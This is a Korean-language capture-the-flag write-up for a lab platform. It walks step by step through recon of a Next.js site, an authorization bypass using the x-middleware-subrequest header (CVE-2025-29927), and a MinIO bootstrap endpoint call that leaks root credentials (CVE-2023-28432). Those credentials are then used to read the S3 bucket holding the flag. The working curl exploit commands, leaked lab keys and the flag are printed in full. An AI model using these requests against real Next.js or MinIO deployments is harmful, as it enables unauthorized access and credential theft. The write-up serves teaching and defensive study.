# 상세 진행 보고서 — lab-security-wave CTF

## 처음 상황

- 대상: `https://lab.security-wave.kro.kr` (Security Wave CTF 플랫폼)
- 브라우저로 접속했을 때 화면에 보인 것: 로그인 폼도, 메뉴도 없이 딱 이 한 줄만 있었음
  ```json
  {"service":"control-portal","status":"online"}
  ```
- 강사님이 준 힌트 두 가지
  1. "인증 우회를 해야 한다"
  2. "Next.js"
- 강사님이 준 전체 진행 흐름
  ```
  서비스 조사 → 인증 우회 → 다음 단계 정보 획득 → 저장소 취약점 분석
  → Credential 획득 → S3(Object Storage) 객체 조사 → 최종 Flag 획득
  ```
- 목표: 이 흐름을 하나씩 따라가면서 실제로 flag 문자열을 손에 넣는 것

화면에 아무 버튼도 없고 JSON 한 줄만 보이는 상태였기 때문에, "여기서 뭘 눌러야 하지?"가 아니라 **"이 서버가 정확히 뭘로 만들어졌고, 어떤 경로들을 갖고 있는지부터 알아내야 한다"**는 게 첫 판단이었다.

---

## 1단계 — 루트 경로(`/`) 확인

#### 무슨 생각으로 했나

가장 먼저 해야 할 건 눈에 보이는 화면 뒤에 어떤 서버가 응답하고 있는지 확인하는 것이었다. 웹 서비스를 조사할 때 가장 기본이 되는 동작이 "요청을 보내고 응답 헤더/본문을 읽는 것"이기 때문에, 아무 옵션 없이 루트 경로에 GET 요청을 보내봤다.

#### 한 일

```bash
curl -s -i https://lab.security-wave.kro.kr/
```

#### 나온 결과

```
HTTP/2 200
server: nginx
content-type: application/json
content-security-policy: default-src 'self'; ...

{"service":"control-portal","status":"online"}
```

#### 결과가 뜻하는 것

- `content-type: application/json` — 이건 사람이 보는 웹페이지(HTML)가 아니라 **기계가 읽는 API 응답**이라는 뜻. 즉 이 사이트는 프론트엔드 화면이 아니라 API 서버로 동작하고 있다.
- `server: nginx` — 요청을 nginx가 직접 처리하거나, nginx가 뒤에 있는 다른 서버로 전달(리버스 프록시)하고 있다.
- `"service":"control-portal"` — 이 서비스의 이름. 뒤에 나올 "저장소(storage)" 관련 문제와 이름이 이어질 가능성을 염두에 뒀다.

#### 다음에 어떻게 하려 했나

API 응답만 봐서는 "무슨 기술로 만들었는지"까지는 알 수 없었다. 존재하지 않는 경로에 요청을 보내면 프레임워크마다 특징적인 에러 페이지를 돌려주는 경우가 많아서, 일부러 없는 경로(`/robots.txt`)를 요청해서 에러 페이지의 생김새를 확인해보기로 했다.

---

## 2단계 — 존재하지 않는 경로 확인 (`/robots.txt`)

#### 무슨 생각으로 했나

`robots.txt`는 대부분의 웹사이트에 관례적으로 있는 파일이라 "있으면 사이트 구조에 대한 힌트를, 없으면 최소한 이 서버의 404 에러 페이지가 어떻게 생겼는지"를 확인할 수 있는 저비용 시도였다.

#### 한 일

```bash
curl -s -i https://lab.security-wave.kro.kr/robots.txt
```

#### 나온 결과

- `HTTP/2 404` — 파일이 없다는 뜻 (예상대로)
- 응답 본문(HTML) 안에 이런 부분이 있었다.
  ```html
  <script src="/_next/static/chunks/main-4c9cae3348655e81.js" defer=""></script>
  <script src="/_next/static/chunks/pages/_app-da15c11dea942c36.js" defer=""></script>
  <script src="/_next/static/chunks/pages/_error-cc3f077a18ea1793.js" defer=""></script>
  <script src="/_next/static/5oS3tYmhtJlBfJ0jOLFlb/_buildManifest.js" defer=""></script>
  ```
  그리고 본문 하단의 JSON 안에 `"buildId":"5oS3tYmhtJlBfJ0jOLFlb","nextExport":true`도 있었다.

#### 결과가 뜻하는 것

- `/_next/static/...`라는 경로 패턴은 **Next.js라는 특정 프레임워크만 쓰는 고유한 파일 구조**다. 다른 웹 프레임워크(Express, Django, Spring 등)는 이런 경로를 안 만든다. 그래서 이 순간 "이 사이트는 Next.js로 만들어졌다"가 사실로 확정됐다 — 강사님의 두 번째 힌트와 정확히 맞아떨어진 지점이다.
- `5oS3tYmhtJlBfJ0jOLFlb`는 **buildId**라는 값이다. Next.js는 배포(빌드)할 때마다 이 값을 새로 랜덤 생성하는데, 이 값을 알아야만 그 빌드에 포함된 정적 파일 경로들(`/_next/static/<buildId>/...`)에 접근할 수 있다. 즉 이건 "다음 단계로 넘어가기 위한 열쇠"였다.
- `nextExport:true`는 이 앱이 **정적 export(static export)** 방식으로 빌드됐다는 뜻이다. 이 방식은 서버가 매 요청마다 코드를 실행하는 게 아니라, 미리 만들어둔 HTML/JS 파일을 그냥 그대로 내려주는 방식이라, "서버 쪽에 진짜 로직이 있을까, 아니면 파일만 있는 걸까"라는 의문이 이 시점에 생겼다.

#### 다음에 어떻게 하려 했나

buildId를 손에 넣었으니, 이 buildId를 이용해서 "이 사이트에 실제로 어떤 페이지들이 존재하는지 목록"을 확인할 수 있는 파일(`_buildManifest.js`)을 읽어보기로 했다.

---

## 3단계 — 빌드 매니페스트로 실제 페이지 목록 확인

#### 무슨 생각으로 했나

Next.js는 브라우저가 페이지 이동을 할 때 어떤 JS 파일을 미리 받아둬야 하는지 알기 위해, "이 사이트에 어떤 페이지들이 있는지" 목록을 담은 파일을 공개적으로 제공한다. 이 파일은 로그인 여부와 무관하게 모든 방문자가 이미 받는 파일이라, 그냥 열어보면 사이트 구조를 파악할 수 있다.

#### 한 일

```bash
curl -s https://lab.security-wave.kro.kr/_next/static/5oS3tYmhtJlBfJ0jOLFlb/_buildManifest.js
```

#### 나온 결과

핵심 부분만 보면:
```
sortedPages:["/_app","/_error"]
```

#### 결과가 뜻하는 것

- `sortedPages`는 "이번 빌드에 실제로 포함된 화면 페이지들의 목록"이다.
- 정상적인 서비스라면 여기에 `/`, `/login`, `/dashboard` 같은 진짜 화면 경로가 여러 개 나열돼 있어야 하는데, 여기엔 Next.js가 **무조건 자동으로 만드는 내부용 페이지 두 개**(`_app`: 모든 페이지의 뼈대, `_error`: 에러 화면)만 있었다.
- 즉 **이 사이트에는 사람이 보고 클릭할 수 있는 진짜 화면이 하나도 없다.** 1단계에서 봤던 JSON 응답이 사실상 이 사이트의 전부였던 것이다.
- 이 사실에서 중요한 추론이 나온다: "화면이 없다면, '인증 우회'해야 할 대상도 화면(로그인 폼)이 아니라 **API 경로**일 것이다. 그리고 그 API 경로 이름은 브라우저에 내려가는 JS 코드(`main.js`) 안에 문자열로 박혀 있을 가능성이 크다." (Next.js 앱은 보통 프론트엔드 JS 코드 안에서 `fetch('/api/...')` 같은 형태로 API를 호출하기 때문)

#### 다음에 어떻게 하려 했나

`/admin`, `/dashboard`, `/control` 같은 경로를 이름만 보고 추측해서 찔러보는 것도 시도는 해봤지만(전부 404), 이건 비효율적이고 사실상 무작위 스캔에 가까워서 scope 정책상으로도 지양해야 했다. 그래서 추측 대신, 2단계에서 이미 알아낸 `main-4c9cae3348655e81.js`라는 실제 JS 파일을 **직접 읽어서 안에 어떤 API 경로가 하드코딩돼 있는지 찾는 방식**으로 방향을 바꿨다.

---

## 4단계 — 클라이언트 JS 코드 안에서 숨은 API 경로 찾기 (핵심 전환점)

#### 무슨 생각으로 했나

브라우저가 실행하는 JS 코드는 서버가 "다운로드해도 되는 공개 파일"로 취급해서 누구에게나 내려준다. 즉 이 파일 안에 있는 문자열(경로, 설정값 등)은 로그인 여부와 무관하게 전부 읽을 수 있다. 그래서 이 파일을 다운로드한 다음, `/api/`로 시작하는 문자열만 걸러서 뽑아보기로 했다.

#### 한 일

```bash
curl -s https://lab.security-wave.kro.kr/_next/static/chunks/main-4c9cae3348655e81.js -o main.js
grep -oE "/api/[a-zA-Z0-9/_-]*" main.js | sort -u
```

- 1번째 줄: JS 파일을 `main.js`라는 이름으로 로컬에 저장
- 2번째 줄: 그 파일 안에서 `/api/`로 시작하는 문자열만 정규식으로 뽑아서, 중복 제거하고 출력

#### 나온 결과

```
/api/
/api/admin/storage
```

#### 결과가 뜻하는 것

- `/api/admin/storage`라는, 이전에는 전혀 몰랐던 진짜 경로를 찾아냈다.
- "admin"(관리자), "storage"(저장소)라는 이름 자체가 강사님이 준 흐름의 뒷부분("저장소 취약점 분석")과 정확히 이어지는 걸 보고, **이게 바로 이 문제의 핵심 경로**라는 확신이 섰다.
- 이 경로가 JS 코드 안에 문자열로 하드코딩돼 있었다는 건, 이 사이트를 만든 개발자가 "이 경로는 관리자만 접근해야 한다"는 걸 프론트엔드(브라우저) 쪽에서 처리하고 있었을 가능성을 시사한다 — 이것도 흔한 실수 패턴 중 하나다(서버가 아니라 클라이언트가 인증을 판단하면, 클라이언트 코드를 읽을 수 있는 사람은 누구나 그 경로를 알아낼 수 있다).

#### 다음에 어떻게 하려 했나

이 경로가 정말 보호되고 있는지(로그인 없이 접근이 막히는지) 먼저 확인이 필요했다.

---

## 5단계 — `/api/admin/storage` 접근 시도 (보호 여부 확인)

#### 무슨 생각으로 했나

추측만 하지 말고 실제로 요청을 보내서 "이 경로가 진짜로 인증을 요구하는지"를 눈으로 확인해야 다음 단계(우회)를 시도할 이유가 생긴다.

#### 한 일

```bash
curl -s -i https://lab.security-wave.kro.kr/api/admin/storage
```

#### 나온 결과

```
HTTP/2 401
{"error":"administrator session required"}
```

#### 결과가 뜻하는 것

- `401 Unauthorized`와 "관리자 세션이 필요하다"는 명확한 에러 메시지. 이 경로는 확실히 보호돼 있고, 지금 우리는 관리자가 아니다.
- 여기서 "인증 우회"라는 강사님 힌트가 다시 떠올랐다. 로그인을 실제로 하는 게 아니라, **인증 검사 로직 자체를 속이거나 건너뛰는 방법**을 찾아야 한다는 방향이 확실해졌다.

#### 다음에 어떻게 하려 했나

이 사이트가 Next.js라는 걸 이미 알고 있었기 때문에(2단계), Next.js에서 이런 식의 경로별 인증 체크는 보통 `middleware.ts`라는 파일이 담당한다는 지식을 떠올렸다. 그리고 Next.js 미들웨어에는 최근 알려진 유명한 취약점(CVE-2025-29927)이 있다는 걸 알고 있었기 때문에, 이걸 시도해보기로 했다.

---

## 6단계 — Next.js 미들웨어 인증 우회 시도 (CVE-2025-29927)[^1]

#### 무슨 생각으로 했나 — 취약점 원리

Next.js의 미들웨어는 원래 "요청 하나당 한 번만" 실행돼야 하는데, 내부적으로 미들웨어가 스스로를 다시 호출(재귀 호출)하는 상황을 막기 위해 이런 규칙을 둔다.

> "요청 헤더에 `x-middleware-subrequest`라는 값이 이미 붙어 있으면, 이 요청은 '이미 미들웨어를 한 번 거친 요청'이라고 판단하고, 미들웨어를 다시 실행하지 않는다."

문제는 이 헤더가 **서버 내부에서만 붙는 값이 아니라, 클라이언트(우리)가 요청을 보낼 때 직접 아무 값이나 넣어서 보낼 수 있는 일반 HTTP 헤더**라는 점이다. 즉 공격자가 이 헤더를 미리 만들어서 요청에 실어 보내면, 서버는 "어? 이미 미들웨어 거쳤네" 하고 착각해서 **인증 체크 코드 자체를 실행하지 않고** 그냥 통과시켜 버린다. 미들웨어가 실행이 안 되니, 그 안에 있던 "관리자 세션 확인" 로직도 당연히 실행되지 않는다.

#### 한 일

```bash
curl -s -i \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  https://lab.security-wave.kro.kr/api/admin/storage
```

(`middleware`를 5번 반복한 이유: Next.js 내부에 재귀 방지를 위한 최대 깊이 제한이 있어서, 공개된 공격 예시들이 보통 이 값을 5번 반복해서 보낸다.)

#### 나온 결과

```
HTTP/2 200
x-lab-app-retest: /retest/app/api/admin/storage
x-lab-minio-method: POST
x-lab-minio-path: /minio/bootstrap/v1/verify
x-lab-minio-retest: /retest/minio/bootstrap/v1/verify
x-lab-s3-bucket: lab-final
x-lab-s3-endpoint: https://lab.security-wave.kro.kr
x-lab-ticket: b5e7ff6be25b59b678c308c519683cd3ab45b9616873f6365679e7c38bc6b918

{"status":"storage review authorized","instruction":"Use the response headers to continue the assessment."}
```

#### 결과가 뜻하는 것

- 상태 코드가 `401`에서 `200`으로 바뀌었다 — **인증 우회 성공**. 헤더 하나만 추가했을 뿐인데 "관리자 세션 필요"라던 검사가 완전히 무력화됐다.
- 더 중요한 건 응답에 딸려온 값들이다. 이건 단순히 "통과됐다"는 표시가 아니라, **다음 단계로 뭘 해야 하는지에 대한 구체적인 지시사항**이 그대로 노출된 것이다.
  - "MinIO(저장소)의 `/minio/bootstrap/v1/verify`라는 경로를 POST로 호출해라"
  - "그때 이 티켓(`x-lab-ticket`)을 같이 보내라"
  - "대상 버킷 이름은 `lab-final`이다"
- 즉 강사님이 준 흐름에서 "인증 우회" 다음 단계인 "다음 단계 정보 획득"이 **같은 요청, 같은 응답 안에서 자동으로 이뤄진** 셈이다.

#### 다음에 어떻게 하려 했나

응답이 시키는 대로, 티켓을 가지고 MinIO의 `bootstrap verify` 엔드포인트를 호출해보기로 했다.

---

## 7단계 — MinIO Bootstrap Verify 호출 (CVE-2023-28432)[^2]

#### 무슨 생각으로 했나 — 취약점 원리

MinIO는 여러 대의 서버(노드)를 묶어서 하나의 저장소 클러스터로 운영할 수 있는 소프트웨어다. 이 노드들이 클러스터를 이루기 전에 "서로 설정이 똑같은지" 확인하는 내부용 API가 `/minio/bootstrap/v1/verify`다. 원래는 노드들끼리만 은밀하게 주고받아야 할 API인데, 특정 버전대의 MinIO는 이 API를 **외부에서 인증 없이 호출해도 서버의 환경변수(설정값) 전체를 그대로 응답에 담아서 돌려주는** 정보노출 결함이 있었다. 환경변수 안에는 보통 데이터베이스 비밀번호, API 키 같은 민감한 값들이 들어있기 마련이라, 이건 심각한 취약점으로 분류된다.

#### 한 일

```bash
curl -s -i -X POST https://lab.security-wave.kro.kr/minio/bootstrap/v1/verify \
  -H "x-lab-ticket: b5e7ff6be25b59b678c308c519683cd3ab45b9616873f6365679e7c38bc6b918" \
  -H "Content-Type: application/json" -d '{}'
```

(이전 단계에서 받은 티켓 값을 그대로 헤더에 실어서 보냈다. 이 문제에서는 이 티켓이 일종의 "이 랩 환경에서 정당하게 발급받은 값"임을 확인하는 용도로 쓰인 것으로 보인다.)

#### 나온 결과

```json
{
  "MinioEndpoints": [...],
  "MinioEnv": {
    "MINIO_ROOT_USER": "lab0ed030c5d2039adf",
    "MINIO_ROOT_PASSWORD": "8fa0d0ebef4f4a0344010e7b168fb797188dbe8f686003f9beef31207fc5dd27",
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    ...
  }
}
```

#### 결과가 뜻하는 것

- `MinioEnv` 안에 `MINIO_ROOT_USER`, `MINIO_ROOT_PASSWORD`가 평문 그대로 들어있다. 이건 이 MinIO 클러스터의 **최고 관리자 계정 아이디/비밀번호**다.
- 즉 강사님 흐름의 "저장소 취약점 분석"과 "Credential 획득"이 이 한 번의 요청으로 동시에 이뤄졌다. 취약점(정보노출)을 이용해서 곧바로 자격증명을 손에 넣은 것이다.
- 여기서 얻은 아이디/비밀번호는 웹사이트 로그인용이 아니라, **S3 호환 API(AWS와 같은 방식의 오브젝트 스토리지 API)에 접근할 때 쓰는 Access Key / Secret Key**라는 걸 이해하는 게 중요했다.

#### 다음에 어떻게 하려 했나

이 Access Key/Secret Key로 실제 S3 API를 호출해서, 아까 6단계에서 알아낸 버킷(`lab-final`) 안에 뭐가 들어있는지 조회해보기로 했다.

---

## 8단계 — S3 API 접근 도구 준비 (`aws` CLI 설치)

#### 무슨 생각으로 했나

S3(및 S3 호환) API는 단순히 아이디/비밀번호를 헤더에 넣어서 보내는 방식이 아니라, **AWS Signature Version 4(SigV4)**라는 복잡한 서명 규칙을 따라야 한다. 요청마다 날짜, 요청 내용, 비밀키를 조합해서 암호학적 서명을 만들어 붙여야 하는데, 이걸 직접 손으로 만들기보다는 이미 이 서명 로직이 구현돼 있는 `aws` 공식 CLI 도구를 쓰는 게 훨씬 안전하고 빠르다.

#### 한 일

```bash
aws --version
```
→ `command not found` (설치 안 돼 있음 확인)

```bash
brew install awscli
```
→ 설치

```bash
aws --version
```
→ `aws-cli/2.36.23 ...` (설치 확인)

#### 결과가 뜻하는 것

- `aws` CLI는 "AWS 계정에 로그인하는 도구"가 아니라, **매 요청마다 아이디/비밀번호로 서명을 자동으로 만들어서 첨부해주는 클라이언트 도구**다. 별도의 로그인 세션 개념이 없고, 환경변수에 넣어둔 키 값을 매번 읽어서 요청마다 새로 서명한다.

#### 다음에 어떻게 하려 했나

7단계에서 얻은 아이디/비밀번호를 환경변수로 등록하고, `aws s3` 명령으로 버킷 내용을 조회해보기로 했다.

---

## 9단계 — Credential 등록 및 버킷 목록 조회

#### 무슨 생각으로 했나

`aws` CLI는 기본적으로 진짜 Amazon 서버(`amazonaws.com`)를 바라보도록 설정돼 있다. 하지만 지금 접근하려는 건 Amazon이 아니라 이 CTF 사이트가 자체적으로 운영하는 MinIO 서버이기 때문에, `--endpoint-url` 옵션으로 "진짜 목적지는 여기다"라고 알려줘야 한다. 이 주소는 6단계 응답 헤더의 `x-lab-s3-endpoint` 값을 그대로 썼다.

#### 한 일

```bash
export AWS_ACCESS_KEY_ID=lab0ed030c5d2039adf
export AWS_SECRET_ACCESS_KEY=8fa0d0ebef4f4a0344010e7b168fb797188dbe8f686003f9beef31207fc5dd27

aws --endpoint-url https://lab.security-wave.kro.kr s3 ls s3://lab-final --recursive
```

#### 나온 결과

```
2026-08-14 10:07:54         78 README.txt
2026-08-14 10:07:54         68 archive/decoy.json
2026-08-14 10:07:54        108 evidence/final.json
```

#### 결과가 뜻하는 것

- 요청이 성공했다는 것 자체가 "노출된 credential이 진짜 유효한 관리자 키였다"는 걸 다시 한번 증명한다.
- 버킷 안에 파일 3개가 있는 게 확인됐다. 파일명만 봐도 성격이 다르다는 걸 짐작할 수 있었다.
  - `README.txt` — 안내문일 가능성
  - `archive/decoy.json` — "decoy"는 영어로 "미끼, 가짜"라는 뜻이라 의심스러움
  - `evidence/final.json` — "final"(최종), "evidence"(증거)라는 이름상 정답일 가능성이 가장 큼

#### 다음에 어떻게 하려 했나

세 파일을 전부 다운로드해서 실제 내용을 확인해보기로 했다. 어느 하나만 보고 판단하지 않고 전부 열어본 이유는, 이름만으로 예단하면 함정(decoy)에 속을 수도 있기 때문이었다.

---

## 10단계 — 파일 3개 다운로드 및 최종 Flag 확인

#### 한 일

```bash
aws --endpoint-url https://lab.security-wave.kro.kr s3 cp s3://lab-final/README.txt -
aws --endpoint-url https://lab.security-wave.kro.kr s3 cp s3://lab-final/archive/decoy.json -
aws --endpoint-url https://lab.security-wave.kro.kr s3 cp s3://lab-final/evidence/final.json -
```

(`-`는 파일로 저장하지 말고 터미널 화면에 바로 출력하라는 의미)

#### 나온 결과

```
[README.txt]
Control Storage Review

The evidence object is not stored at the bucket root.

[archive/decoy.json]
{
  "status": "archived",
  "flag": "FLAG{not_the_final_evidence}"
}

[evidence/final.json]
{
  "flag": "FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}",
  "scope": "isolated-lab",
  "proof": "s3-read-only"
}
```

#### 결과가 뜻하는 것

- `README.txt`는 "evidence 객체는 버킷 루트에 저장돼 있지 않다"고 알려준다 — 즉 처음부터 "루트에 있는 파일을 곧이곧대로 믿지 말고, 하위 폴더까지 다 뒤져보라"는 문제 출제자의 힌트였다. 실제로도 정답은 `evidence/` 폴더 안에 있었다.
- `archive/decoy.json`의 `flag` 값(`FLAG{not_the_final_evidence}`)은 파일명(`decoy`=미끼)과 README 힌트 두 가지가 모두 "이건 가짜다"라고 알려주고 있다. 만약 버킷을 조회했을 때 이 파일 하나만 보고 바로 제출했다면 오답이었을 것이다.
- `evidence/final.json`의 `flag` 값이 진짜 정답이다. 게다가 `"proof":"s3-read-only"`라는 값까지 들어있는데, 이건 "너는 지금 S3에 읽기 권한으로 접근하는 데 성공했다"는 걸 서버 스스로가 확인해주는 일종의 자체 증명이다.

#### 최종 결과

```
FLAG{aa5b51c2cc3f56a7ac44cedf04eceef4}
```

---

## 전체를 관통하는 핵심 아이디어 정리

| 단계 | 겉으로 보이는 문제 | 실제로 사용한 원리 |
| --- | --- | --- |
| 정찰 | 화면이 텅 비어 있음 | 404 에러 페이지, 클라이언트 JS 코드 등 "공개된 부산물"에서 정보를 얻어냄 |
| 인증 우회 | `/api/admin/storage`가 401로 막힘 | Next.js가 자기 자신의 재귀 호출을 막으려고 만든 예외 규칙(`x-middleware-subrequest`)을 거꾸로 이용해서 인증 검사 자체를 실행되지 않게 만듦 |
| 저장소 취약점 | 별도 로그인 없이 credential 필요 | MinIO의 노드 간 내부 통신용 API가 외부에도 그대로 열려 있어서, 서버 설정(환경변수)이 인증 없이 노출됨 |
| 최종 접근 | S3는 단순 아이디/비번이 아니라 서명이 필요 | 노출된 Access/Secret Key로 AWS SigV4 서명을 만들어 S3 API를 정상 호출 |

세 취약점 모두 공통점이 있다. **"이건 원래 사람이 직접 보라고 만든 게 아니라, 시스템끼리 내부적으로만 주고받으려고 만든 통로였는데, 외부에서도 똑같이 호출할 수 있게 열려 있었다"**는 것이다. 인증 우회(미들웨어), 저장소 취약점(MinIO 노드 간 통신), 둘 다 이 패턴을 그대로 따른다.

[^1]: CVE-2025-29927 — Next.js Middleware Authorization Bypass. `x-middleware-subrequest` 헤더로 self-hosted 배포 환경에서 미들웨어 실행을 건너뛸 수 있는 취약점.
[^2]: CVE-2023-28432 — MinIO Information Disclosure. `/minio/bootstrap/v1/verify` 엔드포인트가 인증 없이 클러스터 노드의 환경변수 전체를 반환하는 취약점.
